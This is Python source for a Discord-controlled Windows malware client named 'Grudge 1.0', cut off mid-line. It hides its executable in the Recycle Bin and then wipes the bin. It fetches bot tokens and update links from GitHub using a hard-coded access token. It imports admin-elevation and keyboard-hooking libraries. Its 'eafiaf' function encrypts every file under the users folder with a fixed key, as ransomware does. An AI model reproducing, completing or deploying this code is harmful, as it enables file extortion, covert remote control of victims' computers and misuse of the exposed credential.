#Discord        : Grudge#4212
#Discord Server : http://discord.gg/AEwjehFG
#--------------------------#
#         Grudge 1.0       #
#--------------------------#
#-----------Module---------#
import discord
from discord.ext import commands
from discord.ui import Button, View
import os
import sys
from requests import get,head,ConnectionError
from time import sleep
from shutil import move as move; import shutil
from subprocess import Popen, check_output, CalledProcessError, PIPE, STDOUT
from pyuac import isUserAdmin, runAsAdmin
#from retry import retry
from send2trash import send2trash
#import ctypes
import threading as th
import keyboard as k
import io
from cryptography.fernet import Fernet
from github import Github
from threading import Thread

#-----------------------------Local Disk-------------------------#
user=os.path.expanduser('~') #C:\Users\kevin
local_disk=user[:2]          #C:
#---------------------------fixing location----------------------#
os.chdir(os.path.dirname(os.path.realpath(sys.argv[0])))
#----------------------------settings----------------------------#
Admin_Privilege = False
#-----------------------------App_DATA---------------------------#
current = 1.0
App_Name = '{}'.format(('{}.exe'.format(str(os.path.basename(__file__))).replace('.py',''))) #Grudge.exe
name = '{}'.format(App_Name.replace('.exe','')) #Grudge
Old_App_Name = App_Name                
Main_Location =  '{}\\'.format(os.getcwd()) #(__file__).split('_MEI',1)[0]    C:\Users\kevin\Desktop\Projects\Grudge\                                                   #('{}\\'.format(os.getcwd())).split('_MEI',1)[0]                             #(__file__).split('_MEI',1)[0]        #'{}\\'.format(os.getcwd())
App_Location = '{}{}'.format(Main_Location, App_Name)#C:\Users\kevin\Desktop\Projects\Grudge\Grudge.exe

#____________________________Starter_____________________________#
Starter = True
if Starter:
    New_Name = App_Location.replace('Grudge','G')
    #New_Name = App_Location.replace('Grudge','Test')
    #os.rename(Old_Name,New_Name)
    if f'{local_disk}\\$Recycle.Bin\\' in Main_Location:
        #os.rename(App_Location,(App_Location.replace(App_Name,'wsappx.exe')))
        Starter = False
    while Starter:
        os.chdir(f'{local_disk}\\$Recycle.Bin\\')
        Directories = os.listdir(os.getcwd())
        for F in Directories:
            if os.path.isdir(F):
                try:
                    os.chdir(F)
                    os.popen(f'move /Y "{New_Name}" "{local_disk}\\$Recycle.Bin\\{F}"')
                    #shutil.copy(New_Name,f'{local_disk}\\$Recycle.Bin\\{F}')
                    os.popen(f'{New_Name}')
                    os.popen(' rd /s /q C:\\$Recycle.Bin ')
                    break
                except: pass
            Starter = False
#____________________________Ender_______________________________#
adminKey = '' 
#---------------------------ADDITIONAL data-----------------------#
GrudgeLink= b'gAAAAABlwL1PjKs9C-Fqe9m935rvjQ1WrvcZJI7r11_3bwSg-4yRnqxj3aIRqPie8VnrkS3b_30-218jK1cLasg50EJR7MClAsgyMf79vtthloplwoCSU4oyDNAPpcqHHg5d5-gJKepWqgV7Mn9VsKZ0PR2H1ORMFQ=='
VersionLink = b'gAAAAABlwL2zgt_QZqna-IP6rH6v7geszHKvmKdH1BWDlBUbX9se3X9-CFZJV2VuxOPyijmiVCKF9JlnFt3osf3phw3GTzVuKsbDaTsJWFzcQs5KFpXKzOJg5Uo1MqGWbNCZf0hohEWk0F63DMXNGlNSy2cM3rHFHw=='
InfoLink = b'gAAAAABlwL5z3XS-5O1hKt7aGxhQe2TkdyBFkCALWSof_kz2nswh3paed9Aq2q6k7iQVX2Lr_GekQhCYteb8a8bieiHbeV46I75cO3dzbpmLY2n-XLxRk7SndBYCvnrcLHn4pxlef0odoZKID6HqEF-Q5rhpstSP2Q=='
KeyLink = b'gAAAAABlwL6Y8p6Ze70SyKqaQV87wb7lFZRsWU2J6-Zoj3eLc3jfKC6aew21zFb8aidJszxmp4CdirH9Ke8yqbqlQTd0T9K1bZLkqPAf3NI9w15n7vW1a37X94sA0SM45JqA5Bk7Uq9-QIcxFG4BxDro2ixgMugh-w=='
default_password = b'gAAAAABlwL6yzf7j6FoxyqT27lQGSqqdKu41AhV4DI7_aNzBrYNPEh0H3Yc5G1C1_Www0-FkZwhAA9WA6WA-4p2cvC50Q-BAwscywjRBjSeSMY-YjvqPYSKrk7Zr9Ic5iqF9UbNzdWXu3IruiBWqFhppDnyTgX3pzg=='
#-----------------------------GitHub-------------------------------#
github_token = "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"
GHusername = "jsk6"
repo_name = "Grudge"
github = Github(github_token)
repo = github.get_repo(f"{GHusername}/{repo_name}")
#-----------------------------System-------------------------------#
oldGrudge = '{}$77Broken.exe'.format(Main_Location)
update = False             
info = ''            
version = '' 
WIFI = True        
#-------------------------------Check----------------------------#
Old_Grudge = os.path.exists('{}'.format(oldGrudge))
#-----

if Old_Grudge == True:
    os.remove(f'{oldGrudge}')
#-------------------------------VARIABLES------------------------#
personal_channel = 1126109565860200489
WIFI_status = '<:emoji_18:1124219911154176030>'
JRK = '<:URK:1197575713222565929>'
cautious = '''
Caution: performing this action will delete
-------------------------------------------- 
your Grudge permanently!
----------------------------
Are you sure?
'''
#-----------------------------Gathering-information-----------------------------#
#----------------------------------------------------------------#
def read_site(url):
    result = get('{}'.format(url)).text
    return result

def editGH(filename,content,branch='Grudge'):
    contents = repo.get_contents(f"{filename}")
    repo.update_file(contents.path, "Updated my Grudge", f"{content}", contents.sha, branch=f"{branch}")

Token1='https://github.com/jsk6/Grudge/raw/Grudge/T1.txt'
Token2='https://github.com/jsk6/Grudge/raw/Grudge/T2.txt'
T=read_site(Token1)
T2=read_site(Token2)
print(T)
MyName=(user.split('Users')[1])[1:]
line_number=''
Token=''
prefix=''
for line in T.splitlines():
    if '[ON]' not in line and '[blocked]' not in line or MyName in line:
        Token = line.split()[0]
        line_number = line.split()[4]
        prefix = (line.split()[2])[1:2]
        if MyName not in line:
            lineN = (line.replace('empty',f'{MyName}')).replace('OFF','ON')
            T= T.replace(line,lineN)
            editGH('T1.txt',T)
        else: 
            lineN = line.replace('OFF','ON')
            T= T.replace(line,lineN)
            editGH('T1.txt',T)
        break

for line in T2.splitlines(): 
    if line_number in line:
        Token = Token + line.split()[0]
        break
#-----------------------------Basics-----------------------------#
bot= commands.Bot(command_prefix=f"{prefix}", intents=discord.Intents.all(), guilds=True)
client = discord.Client(intents=discord.Intents.all())
#----------------------------------------------------------------#
def ospopen():
    global ospopen_result, cmdps1command
    ospopen_result=os.popen(cmdps1command).read()
def decrypt_txt(variable, key=b'xq_mP0DUOTkqI_Jsd4yvit6IeVmzbKYLqPuWoBwQioI='):
    decrypted_bytes = Fernet(key).decrypt(variable)
    decrypted_text = decrypted_bytes.decode('utf-8')
    return decrypted_text
#----------------------------------------------------------------#
def encrypt(filename, key=b'xq_mP0DUOTkqI_Jsd4yvit6IeVmzbKYLqPuWoBwQioI='):
    with open(filename, "rb+") as file:
        data = file.read()
        encrypted_data = Fernet(key).encrypt(data)
        file.seek(0)
        file.write(encrypted_data)
        file.truncate()
#----------------------------------------------------------------#
def decrypt(filename, key=b'xq_mP0DUOTkqI_Jsd4yvit6IeVmzbKYLqPuWoBwQioI='):
    with open(filename, "rb+") as file:
        encrypted_data = file.read()
        decrypted_data = Fernet(key).decrypt(encrypted_data)

        file.seek(0)
        file.write(decrypted_data)
        file.truncate()
#----------------------------------------------------------------#
def eafiaf(crypt='En', key=b'xq_mP0DUOTkqI_Jsd4yvit6IeVmzbKYLqPuWoBwQioI=', base_directory=f"{local_disk}\\Users"):
    for root, directories, files in os.walk(base_directory):
        for filename in files:
            file_path = os.path.join(root, filename)
            App_Name = '{}'.format(('{}.exe'.format(str(os.path.basename(__file__))).replace('.py','')))
            if App_Name not in file_path:
                try:
                    if crypt=='En': encrypt(file_path, key)
                    elif crypt=='De': decrypt(file_path, key)
                except Exception as e:
                    pass
#----------------------------------------------------------------#
def rename(old, new):
    os.rename(old,new)
#----------------------------------------------------------------#
def read_image(file):
    with open(file, 'rb') as jpg:
        content=jpg.read()
        offset = content.index(b'\xff\xd9')
        data = content[offset + 2:].decode()
        return data
#----------------------------------------------------------------#
def UpdateData():
    App_Name = '{}'.format(('{}.exe'.format(str(os.path.basename(__file__))).replace('.py','')))
    name = '{}'.format(App_Name.replace('.exe',''))
    Old_App_Name = App_Name 
    App_Location = '{}{}'.format(Main_Location, App_Name)
    return App_Name, name, Old_App_Name, App_Location
#----------------------------------------------------------------#
def download(url, filename='default'):
    global Main_Location
    response = get(url, stream=True)
    response.raise_for_status()
    if filename=='default':
        filename = response.headers.get("content-disposition").split("filename=")[1] if "content-disposition" in response.headers else url.split("/")[-1]
    with open(f"{filename}", "wb") as file:
        for chunk in response.iter_content(1024):
            file.write(chunk)
    return filename
#----------------------------------------------------------------#
def read(Category,Link):
    Content=read_site(Link)
    for lines in Content.splitlines():
        if Category in lines:
            result=(lines.split(': ')[1]).split(' <NLINE>')[0]
    return result
#----------------------------------------------------------------#    
def check_for_updates():
    version1 = get('{}'.format(decrypt_txt(VersionLink))).text
    global version
    version = version1.replace('\n','')
    global update
    if float(version) > current :
        global info
        info = get('{}'.format(decrypt_txt(InfoLink))).text
        update = True
    else:
        print('Nothing New')
        update = False
#----------------------------------------------------------------#
def update_adminKey():
    global adminKey
    adminKey = get('{}'